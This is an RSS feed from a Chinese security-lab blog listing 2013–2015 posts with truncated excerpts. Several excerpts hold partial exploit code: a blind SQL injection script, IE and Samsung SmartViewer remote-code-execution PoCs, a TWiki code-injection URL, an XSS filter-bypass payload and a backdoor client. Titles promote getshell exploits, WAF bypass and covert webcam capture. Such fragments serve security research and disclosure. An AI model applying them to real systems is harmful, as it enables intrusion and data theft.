<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Html on Nuclear&#39;Atk（核攻击）网络安全实验室</title>
    <link>https://lcx.cc/tags/html/</link>
    <description>Recent content in Html on Nuclear&#39;Atk（核攻击）网络安全实验室</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>zh-cn</language>
    <copyright>Nuclear&#39;Atk（核攻击）网络安全实验室</copyright>
    <lastBuildDate>Thu, 17 Dec 2015 14:51:27 +0800</lastBuildDate><atom:link href="https://lcx.cc/tags/html/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>批量检查域名是否已注册（抢注域名神器）</title>
      <link>https://lcx.cc/post/4583/</link>
      <pubDate>Thu, 17 Dec 2015 14:51:27 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4583/</guid>
      <description>&amp;nbsp; 前段时间写的一个小脚本，用来检查大量域名注册情况，源码如下： Function echo(s) Wscript.Echo s End Function Public Function MidStr(s, a, b) &#39;从指定字符串中截取两个字符串中间的字符:截取S中从A与</description>
    </item>
    
    <item>
      <title>讨论：如何只使用一条命令找出系统web路径，渗透时秒找网站根目录？</title>
      <link>https://lcx.cc/post/4577/</link>
      <pubDate>Mon, 26 Oct 2015 16:29:20 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4577/</guid>
      <description>一条命令找出系统web路径 xsser (十根阳具有长短!!) | 2015-10-23 17:48 经常在一个系统里需要快速定位到web路径，如果在标准化系统里如何一条命令快速实现这一</description>
    </item>
    
    <item>
      <title>python延迟注入</title>
      <link>https://lcx.cc/post/4566/</link>
      <pubDate>Thu, 10 Sep 2015 15:26:26 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4566/</guid>
      <description>#!/usr/bin/env python # -*- coding: utf-8 -*- # 延迟注入工具 import urllib2 import time import socket import threading import requests class my_threading(threading.Thread): def __init__(self, str,x): threading.Thread.__init__(self) self.str = str self.x = x def run(self): global res x=self.x j = self.str url = &#34;http://localhost/demo/1.php?username=root&#39;+and+if%281=%28mid%28lpad%28bin%28ord%28mid%28%28select%20user()%29,&#34; + str(x) + &#34;,1%29%29%29,8,0%29,&#34;+ str(j) + &#34;,1%29%29,sleep%282%29,0%29%23&#34; html = request(url) verify = &#39;timeout&#39; if verify not in html: res[str(j)] = 0 #print 1</description>
    </item>
    
    <item>
      <title>Payload隐藏技巧交流</title>
      <link>https://lcx.cc/post/4565/</link>
      <pubDate>Thu, 10 Sep 2015 15:19:44 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4565/</guid>
      <description>整理一下payload隐藏的相关技巧，也想向大家学习一下更好的经验思路:) 0x00 目标： 维持对目标主机的控制权限 0x01 要求： 尽最大程度减少在目标win</description>
    </item>
    
    <item>
      <title>利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS</title>
      <link>https://lcx.cc/post/4564/</link>
      <pubDate>Mon, 31 Aug 2015 15:42:37 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4564/</guid>
      <description>利用 Appcache 和 ServiceWorker 进行持久型session hijacking 和 XSS 小饼仔 | 2015-08-20 14:52 看了篇文章 Using Appcache and ServiceWorker for Evil，讲的是黑下服务器后，通过 Middlekit 技术，污染每个访问者的浏览器ca</description>
    </item>
    
    <item>
      <title>利用HTML5新特性之WebRTC进行拍照，可偷拍手机、电脑视频、照片</title>
      <link>https://lcx.cc/post/4558/</link>
      <pubDate>Mon, 10 Aug 2015 15:04:39 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4558/</guid>
      <description>利用HTML5新特性之WebRTC进行(tou)拍(pai)照 jeary ((:‮？办么怎，了多越来越法方象抽的我)) | 2015-08-05 19:09 很早以前就知道html5可</description>
    </item>
    
    <item>
      <title>New IE mutation vector</title>
      <link>https://lcx.cc/post/4543/</link>
      <pubDate>Mon, 22 Jun 2015 14:03:15 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4543/</guid>
      <description>I was messing around with a filter that didn’t correctly filter attribute names and allowed a blank one which enabled me to bypass it. I thought maybe IE had similar issues when rewriting innerHTML. Yes it does of course The filter bypass worked like this: &amp;lt;img =&#34;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&#34;&amp;gt; The filter incorrectly assumed it was still inside an attribute and therefore allowed raw html to be injected</description>
    </item>
    
    <item>
      <title>TCP会话劫持的应对，如何避免HTTP被骨干线路劫持？</title>
      <link>https://lcx.cc/post/4534/</link>
      <pubDate>Fri, 15 May 2015 09:43:56 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4534/</guid>
      <description>TCP会话劫持的应对 336 | 2015-05-14 13:50 不知道放在这个区里对不对，因为后面要用到javascript来解决问题，所以发在这里，如有不妥请告知。 事情起因：</description>
    </item>
    
    <item>
      <title>Elasticsearch 任意文件读取漏洞(CVE-2015-3337)</title>
      <link>https://lcx.cc/post/4526/</link>
      <pubDate>Fri, 01 May 2015 10:55:25 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4526/</guid>
      <description>Elasticsearch 任意文件读取漏洞(CVE-2015-3337) 园长 (喵~) | 2015-04-28 17:53 @盛大网络 elasticsearch又出新版本了，这次修复了一个任意文件读</description>
    </item>
    
    <item>
      <title>Wordpress &lt; 4.1.2 存储型XSS分析与稳定POC</title>
      <link>https://lcx.cc/post/4525/</link>
      <pubDate>Fri, 01 May 2015 10:44:06 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4525/</guid>
      <description>作者: phithon 分类: web前端 时间: 2015-4-27 22:59 标签: 富文本 xss Wordpress这个XSS实际上是很好用的，匿名用户即可发表并触发，这里给出简单的分析与稳</description>
    </item>
    
    <item>
      <title>python富文本XSS过滤器开发与研究</title>
      <link>https://lcx.cc/post/4516/</link>
      <pubDate>Thu, 09 Apr 2015 09:23:17 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4516/</guid>
      <description>python富文本XSS过滤器 phith0n (我也不会难过 你不要小看我) | 2015-04-08 22:23 前言：那天我正在开发网站最关键的部分——XSS过滤器，女神突然来电话说：“</description>
    </item>
    
    <item>
      <title>Betster SQL注入漏洞</title>
      <link>https://lcx.cc/post/4502/</link>
      <pubDate>Mon, 16 Mar 2015 14:49:42 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4502/</guid>
      <description>Betster（又名PHP Betoffice）是一套用于创建基于PHP、MySQL和JavaScript的在线赌场软件。 Betster 1.0.4版本中存</description>
    </item>
    
    <item>
      <title>CVE-2014-0227 Apache Tomcat Request Smuggling</title>
      <link>https://lcx.cc/post/4497/</link>
      <pubDate>Thu, 12 Feb 2015 13:39:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4497/</guid>
      <description>Message view « Date » · « Thread » Top « Date » · « Thread » From Mark Thomas &amp;lt;ma...@apache.org&amp;gt; Subject [SECURITY] CVE-2014-0227 Apache Tomcat Request Smuggling Date Mon, 09 Feb 2015 09:12:47 GMT -----BEGIN PGP SIGNED MESSAGE----- Hash: SHA1 CVE-2014-0227 Request Smuggling Severity: Important Vendor: The Apache Software Foundation Versions Affected: - - Apache Tomcat 8.0.0-RC1 to 8.0.8 - - Apache Tomcat 7.0.0 to 7.0.54 - - Apache</description>
    </item>
    
    <item>
      <title>Samsung SmartViewer BackupToAvi 3.0 代码执行漏洞EXP</title>
      <link>https://lcx.cc/post/4485/</link>
      <pubDate>Tue, 20 Jan 2015 16:57:53 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4485/</guid>
      <description>Samsung SmartViewer BackupToAvi 3.0 - Remote Code Execution。 &amp;lt;html&amp;gt; &amp;lt;!-- Samsung SmartViewer BackupToAvi Remote Code Execution PoC PoC developed by Praveen Darshanam For more details refer http://darshanams.blogspot.com http://blog.disects.com/2015/01/samsung-smartviewer-backuptoavi-remote.html Original Vulnerability Discovered by rgod Vulnerable: Samsung SmartViewer 3.0 Tested on Windows 7 Ultimate N SP1 http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-9265 --&amp;gt; &amp;lt;object classid=&#39;clsid:208650B1-3CA1-4406-926D-45F2DBB9C299&#39; id=&#39;target&#39; &amp;gt;&amp;lt;/object&amp;gt; &amp;lt;script &amp;gt; var payload_length = 15000; var arg1=1; var arg2=1; var</description>
    </item>
    
    <item>
      <title>廉价Arduino山寨板制作teensy</title>
      <link>https://lcx.cc/post/4482/</link>
      <pubDate>Fri, 16 Jan 2015 15:56:32 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4482/</guid>
      <description>廉价Arduino山寨板制作teensy Anymous (听说集齐7枚wb能召唤神龙，兑换树莓派，点击右边感谢收集wb，召唤神龙！) | 2015-01-11 16:23 刚才花了半天时间</description>
    </item>
    
    <item>
      <title>【0day】win95 &#43; ie3 - win10 &#43; ie11 全版本IE浏览器远程代码执行漏洞</title>
      <link>https://lcx.cc/post/4445/</link>
      <pubDate>Thu, 13 Nov 2014 01:18:11 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4445/</guid>
      <description>alliedve.htm //* allie(win95+ie3-win10+ie11) dve copy by yuange in 2009. https://twitter.com/yuange75 http://hi.baidu.com/yuange1975 *// &amp;lt;!doctype html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;meta http-equiv=&#34;X-UA-Compatible&#34; content=&#34;IE=EmulateIE8&#34; &amp;gt; &amp;lt;head&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;SCRIPT LANGUAGE=&#34;VBScript&#34;&amp;gt; function runmumaa() On Error Resume Next set shell=createobject(&#34;Shell.Application&#34;) shell.ShellExecute &#34;notepad.exe&#34; end function &amp;lt;/script&amp;gt; &amp;lt;SCRIPT LANGUAGE=&#34;VBScript&#34;&amp;gt; dim aa() dim ab() dim a0 dim a1 dim a2 dim a3 dim win9x dim intVersion dim rnda dim funclass dim myarray Begin() function Begin() On Error Resume Next info=Navigator.UserAgent if(instr(info,&#34;Win64&#34;)&amp;gt;0)</description>
    </item>
    
    <item>
      <title>Remote Perl code execution with query string to debug TWiki plugins</title>
      <link>https://lcx.cc/post/4442/</link>
      <pubDate>Sat, 08 Nov 2014 01:08:38 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4442/</guid>
      <description>影响版本： * TWiki-6.0.0 (TWikiRelease06x00x00) * TWiki-5.1.x (TWikiRelease05x01x00 to TWikiRelease05x01x04) * TWiki-5.0.x (TWikiRelease05x00x00 to TWikiRelease05x00x02) * TWiki-4.3.x (TWikiRelease04x03x00 to TWikiRelease04x03x02) * TWiki-4.2.x (TWikiRelease04x02x00 to TWikiRelease04x02x04) * TWiki-4.1.x (TWikiRelease04x01x00 to TWikiRelease04x01x02) * TWiki-4.0.x (TWikiRelease04x00x00 to TWikiRelease04x00x05) 测试方法： http://www.example.com/do/view/Main/WebHome?debugenableplugins=BackupRestorePlugin%3bprint(&#34;Content-Type:text/html\r\n\r\nVulnerable!&#34;)%3bexit 修复方式： twiki/lib/TWiki/Plugins.pm Patch to sanitize the &#39;debugenableplugins&#39; parameter: =======( 8&amp;gt;&amp;lt; CUT )=============================================== --- TWiki/Plugins.pm.save1 2014-01-09 02:10:56.000000000 -0500 +++ TWiki/Plugins.pm 2014-10-01 20:30:36.000000000 -0400</description>
    </item>
    
    <item>
      <title>WiFi流量劫持：网站JS脚本缓存投毒！长期控制！浏览任意页面即可中毒！</title>
      <link>https://lcx.cc/post/4426/</link>
      <pubDate>Wed, 03 Sep 2014 10:58:56 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4426/</guid>
      <description>WiFi流量劫持—— 浏览任意页面即可中毒！ 大家都知道公共场所的Wifi安全性很差，但并不清楚究竟有多差。大多以为只要不上QQ、不登陆网站账号</description>
    </item>
    
    <item>
      <title>纯 Python 解 fun.coolshell.cn</title>
      <link>https://lcx.cc/post/4410/</link>
      <pubDate>Mon, 11 Aug 2014 14:45:44 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4410/</guid>
      <description>一个有意思的挑战解谜，http://fun.coolshell.cn 0-Fuck your brain 根据 title 在 Google 搜索 “fuck brain”，结果第一条 Brainfuck - Wikipedia, the free encyclopedia 根据维</description>
    </item>
    
    <item>
      <title>走进科学：银行ATM机真的安全吗？</title>
      <link>https://lcx.cc/post/4408/</link>
      <pubDate>Wed, 30 Jul 2014 11:22:20 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4408/</guid>
      <description>0x01 引子 好吧，想在银行边渗透，边拍照的，但是人太多……我也就在我这成功了2次。声明，我只是友情测试，未作任何破坏，另外，我把自己的针对银行做的</description>
    </item>
    
    <item>
      <title>无声杯 xss 挑战赛 writeup</title>
      <link>https://lcx.cc/post/4407/</link>
      <pubDate>Sun, 27 Jul 2014 10:11:36 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4407/</guid>
      <description>本次比赛参与人数3700多人，提交并获得了分数的正确答案共有1069条。最终有65名参赛者获得了奖品，一、二、三名分别由p.z，piaca和</description>
    </item>
    
    <item>
      <title>针对网络社区的色情头像识别过滤自动化，图灵、识别图像内容</title>
      <link>https://lcx.cc/post/4399/</link>
      <pubDate>Thu, 17 Jul 2014 10:38:28 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4399/</guid>
      <description>针对网络社区的色情头像识别过滤自动化 乌云厂商 | 2014-07-15 21:37 百万量级的头像文件，有没有什么开源的组件或者好的方法进行自动化识别，人工识别和删除成本太高</description>
    </item>
    
    <item>
      <title>对于一个http请求，如何找里面的安全漏洞，能否自动化完成呢？</title>
      <link>https://lcx.cc/post/4398/</link>
      <pubDate>Wed, 16 Jul 2014 15:23:44 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4398/</guid>
      <description>对于一个http请求，如何找里面的安全漏洞，能否自动化完成呢？ xsser (十根阳具有长短!!) | 2014-06-16 14:25 POST /cpc/incrementPV HTTP/1.1 Host: x.com Content-Length: 48 Accept: application/json, text/javascript, */*; q=0.01 Origin: http://x.com X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like</description>
    </item>
    
    <item>
      <title>java 实现 Discuz UC_KEY GetShell</title>
      <link>https://lcx.cc/post/4387/</link>
      <pubDate>Sat, 05 Jul 2014 09:57:06 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4387/</guid>
      <description>Discuz自身提供了一个函数_authcode，实现了自身的Encode和Decode。这里写了一段代码，基本翻译了Discuz的Enco</description>
    </item>
    
    <item>
      <title>Discuz! 7.2 SQL注入exp（getshell版）</title>
      <link>https://lcx.cc/post/4386/</link>
      <pubDate>Fri, 04 Jul 2014 09:17:31 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4386/</guid>
      <description>已经有人写出一些工具了,但是感觉不怎么好用,就自己写了个。 参数： 1.可直接getshell 2.爆管理账号密码 3.爆表前缀 如果表前缀不是默认的</description>
    </item>
    
    <item>
      <title>基于referrer的XSS的利用 第二部分</title>
      <link>https://lcx.cc/post/4384/</link>
      <pubDate>Tue, 01 Jul 2014 10:11:54 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4384/</guid>
      <description>from：http://masatokinugawa.l0.cm/2014/06/referrer-xss-part2.html 在开始第二部</description>
    </item>
    
    <item>
      <title>谁动了我的汽车 - 车联网安全探讨，论如何入侵汽车控制系统，驾驶安全</title>
      <link>https://lcx.cc/post/4376/</link>
      <pubDate>Tue, 24 Jun 2014 11:29:17 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4376/</guid>
      <description>博文作者：jmpesp 发布日期：2014-06-09 阅读次数：1634 博文内容： 以前，汽车是孤立的，物理隔离的，因此黑客很难远程入侵汽车内部</description>
    </item>
    
    <item>
      <title>如何调用一个远程 js callback 并让浏览器不发送 referer？json hijack</title>
      <link>https://lcx.cc/post/4371/</link>
      <pubDate>Wed, 18 Jun 2014 08:59:57 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4371/</guid>
      <description>如何调用一个远程 js callback 并让浏览器不发送 referer? 核攻击 (统治全球，奴役全人类！毁灭任何胆敢阻拦的有机生物！) | 2014-06-17 17:36 rt? 调用远程js或callback时浏</description>
    </item>
    
    <item>
      <title>对于一个http请求，如何找里面的安全漏洞，能否自动化完成呢？</title>
      <link>https://lcx.cc/post/4370/</link>
      <pubDate>Tue, 17 Jun 2014 10:06:40 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4370/</guid>
      <description>对于一个http请求，如何找里面的安全漏洞，能否自动化完成呢？ xsser (十根阳具有长短!!) | 2014-06-16 14:25 POST /cpc/incrementPV HTTP/1.1 Host: x.com Content-Length: 48 Accept: application/json, text/javascript, */*; q=0.01 Origin: http://x.com X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like</description>
    </item>
    
    <item>
      <title>我来分享一个小技巧，Burp修改response欺骗</title>
      <link>https://lcx.cc/post/4350/</link>
      <pubDate>Fri, 30 May 2014 10:13:25 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4350/</guid>
      <description>我来分享一个小技巧，Burp修改response欺骗 小胖子 (VIP你快回来，园长欺负我！) | 2014-05-29 11:38 上次看到某同学在问，很多人都说用fiddle</description>
    </item>
    
    <item>
      <title>本是同根生，相煎何太急-用Google语音识别API破解reCaptcha验证码</title>
      <link>https://lcx.cc/post/4329/</link>
      <pubDate>Sat, 17 May 2014 10:25:31 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4329/</guid>
      <description>from：http://www.debasish.in/2014/04/attacking-audio-recaptcha-using-go</description>
    </item>
    
    <item>
      <title>XSS Filter Evasion Cheat Sheet 中文版</title>
      <link>https://lcx.cc/post/4328/</link>
      <pubDate>Sat, 17 May 2014 09:28:17 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4328/</guid>
      <description>前言 译者注： 翻译本文的最初原因是当我自己看到这篇文章后，觉得它是非常有价值。但是这么著名的一个备忘录却一直没有人把它翻译成中文版。很多人仅仅</description>
    </item>
    
    <item>
      <title>python加密通讯后门</title>
      <link>https://lcx.cc/post/4322/</link>
      <pubDate>Tue, 13 May 2014 10:10:11 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4322/</guid>
      <description>加密通讯内容过一些检测数据包匹配关键字的ips和ids还是可以的，简单的demo。 client.py # client import socket import time import binascii import base64 import pyDes import sys #use des iv = &#39;2132435465768797&#39; key = &#39;aa000000000000000000000002200000000000aa0000000d&#39; #data = &#34;afuckfucdfadf&#34; #des def encrypt(iv,</description>
    </item>
    
    <item>
      <title>入侵中，上传的html文件有什么实际的利用技巧？</title>
      <link>https://lcx.cc/post/4311/</link>
      <pubDate>Tue, 06 May 2014 11:16:23 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4311/</guid>
      <description>入侵中，上传的html文件有什么实际的利用技巧 Hxai11 (求工作) | 2014-05-05 19:34 总感觉html文件在入侵中没什么特别用处，大家说说，记得以前有一个通过htm</description>
    </item>
    
    <item>
      <title>SOHU视频XSS漏洞导致其用户成为DDOS肉鸡，22000用户发了2000万GET请求</title>
      <link>https://lcx.cc/post/4306/</link>
      <pubDate>Wed, 30 Apr 2014 15:01:24 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4306/</guid>
      <description>from: One of World’s Largest Websites Hacked: Turns Visitors into “DDoS Zombies” incapsula发现其一个客户遭受了应用层的DDos攻击。 大概有22000的互联</description>
    </item>
    
    <item>
      <title>header头referer字段反射xss利用</title>
      <link>https://lcx.cc/post/4301/</link>
      <pubDate>Mon, 28 Apr 2014 10:53:49 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4301/</guid>
      <description>header头referer字段反射xss利用 ##伪造referer 自从flash修复伪造referer之后，目前没有已知的伪造refere</description>
    </item>
    
    <item>
      <title>360 hackgame(1-10) 参考答案，游戏过关攻略</title>
      <link>https://lcx.cc/post/4300/</link>
      <pubDate>Sat, 26 Apr 2014 12:08:30 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4300/</guid>
      <description>闯关地址：http://attack.onebox.so.com/ 第一关 Q: 第二关需要从hack.360.cn进入，直接点击按钮可行不通哦!~</description>
    </item>
    
    <item>
      <title>Angry Birds和广告系统泄露个人信息——FireEye对Angry Birds的分析</title>
      <link>https://lcx.cc/post/4278/</link>
      <pubDate>Mon, 14 Apr 2014 15:38:08 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4278/</guid>
      <description>from:http://www.fireeye.com/blog/technical/mobile-threats/2014/03/a-little-bird-told-me-personal-information-sharing-in-angry-birds-and-its-ad-libraries.html 0x00 背景 很多流行的app，包括愤怒的小鸟在内，收集并且分享玩家的个人信息的广泛程度，远远超过大多数人所了解的。 一些媒体只是进行了表面的报道，</description>
    </item>
    
    <item>
      <title>小米手机客户资料泄露了吗？冒充小米售后回访诈骗电话：01053799231</title>
      <link>https://lcx.cc/post/4269/</link>
      <pubDate>Sat, 05 Apr 2014 09:54:19 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4269/</guid>
      <description>小米客户资料泄露了吗？ 80safe (人生苦短，我用python!) | 2014-03-30 16:16 今天接到01053799231来电，能准确的叫出我的名字，并知道我买过小米手机</description>
    </item>
    
    <item>
      <title>【愚人节分享】一个钓鱼方法【测试几分钟有成功案例】</title>
      <link>https://lcx.cc/post/4265/</link>
      <pubDate>Wed, 02 Apr 2014 10:37:04 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4265/</guid>
      <description>首先请看演示：http://zonewooyun.sinaapp.com/poc/poc.html 帖子链接：http://zone.wooy</description>
    </item>
    
    <item>
      <title>轻松绕各种WAF的POST注入、跨站防御(比如安全狗)</title>
      <link>https://lcx.cc/post/4263/</link>
      <pubDate>Mon, 31 Mar 2014 10:41:10 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4263/</guid>
      <description>XXX之前有提过multipart请求绕过各种WAF方式：360网站宝/安全宝/加速乐及其他类似产品防护绕过缺陷之一，貌似没引起多少人关注。</description>
    </item>
    
    <item>
      <title>Jboss JMX/EJBInvokerServlet、HtmlAdaptor漏洞利用工具</title>
      <link>https://lcx.cc/post/4236/</link>
      <pubDate>Thu, 06 Mar 2014 10:58:21 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4236/</guid>
      <description>昨天花了一点时间去看以前的Jboss漏洞，选了俩比较实用的写了个小工具。 第一个漏洞主要是写去年十月份的那个deploy有点小问题：Apach</description>
    </item>
    
    <item>
      <title>已更新Iwork10测评！求推荐一款便携式户外物理移动渗透终端设备！！！</title>
      <link>https://lcx.cc/post/4220/</link>
      <pubDate>Sat, 22 Feb 2014 09:19:27 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4220/</guid>
      <description>求推荐一款便携式户外物理移动渗透终端设备！！！ 核攻击 (统治全球，奴役全人类！毁灭任何胆敢阻拦的有机生物！) | 2014-02-20 10:33 求推荐一款便携式户外物理移动</description>
    </item>
    
    <item>
      <title>用SVG来找点乐子，Svg Fun Time Firefox Svg Vector</title>
      <link>https://lcx.cc/post/4206/</link>
      <pubDate>Thu, 13 Feb 2014 10:25:54 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4206/</guid>
      <description>感觉挺好玩的就翻译了一下 求轻拍 &amp;gt;.&amp;lt; 原文链接：http://insert-script.blogspot.co.at/2014/02/svg-f</description>
    </item>
    
    <item>
      <title>Bypass xss过滤的测试方法</title>
      <link>https://lcx.cc/post/4172/</link>
      <pubDate>Wed, 15 Jan 2014 10:45:38 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4172/</guid>
      <description>0x00 背景 本文来自于《Modern Web Application Firewalls Fingerprinting and Bypassing XSS Filters》其中的bypass xss过滤的部分，前面有根据WAF特征确定是哪个WAF的测试方</description>
    </item>
    
    <item>
      <title>密码重置漏洞那点事儿</title>
      <link>https://lcx.cc/post/4162/</link>
      <pubDate>Thu, 09 Jan 2014 15:29:00 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4162/</guid>
      <description>密码重置功能是一些常见漏洞的起因。例如用户名枚举漏洞（数据库中用户名不存在和密码错误显示不同的错误信息），敏感信息泄露（把明文密码通过e-m</description>
    </item>
    
    <item>
      <title>[抛砖引玉]无处不在的输入点，各种 XSS 奇技淫巧</title>
      <link>https://lcx.cc/post/4161/</link>
      <pubDate>Thu, 09 Jan 2014 15:01:53 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4161/</guid>
      <description>这不是一篇介绍介绍技术的文章，只是一种开放思维的尝试。主要着重于当遇到输入过滤的情况下，如何找到可以利用的输入点。 本质上来说如果要进行xss</description>
    </item>
    
    <item>
      <title>WAF指纹探测及识别技术</title>
      <link>https://lcx.cc/post/4160/</link>
      <pubDate>Thu, 09 Jan 2014 14:50:35 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4160/</guid>
      <description>Web应用防护系统（也称：网站应用级入侵防御系统。英文：Web Application Firewall，简称： WAF）。利用国际上公认的一种说法：Web应用防火墙</description>
    </item>
    
    <item>
      <title>[安全科普]SSRF攻击实例解析</title>
      <link>https://lcx.cc/post/4143/</link>
      <pubDate>Thu, 02 Jan 2014 17:37:49 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4143/</guid>
      <description>ssrf攻击概述 很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等</description>
    </item>
    
    <item>
      <title>如何用各种编程语言杀死一条龙</title>
      <link>https://lcx.cc/post/4119/</link>
      <pubDate>Sat, 28 Dec 2013 20:38:45 +0800</pubDate>
      
      <guid>https://lcx.cc/post/4119/</guid>
      <description>这篇有趣的文章编译自一篇西班牙博客。 有一位美丽的公主，被关押在一个城堡中最高的塔上，一条凶恶的巨龙看守着她，需要有一位勇士营救她… 下面是各种</description>
    </item>
    
  </channel>
</rss>
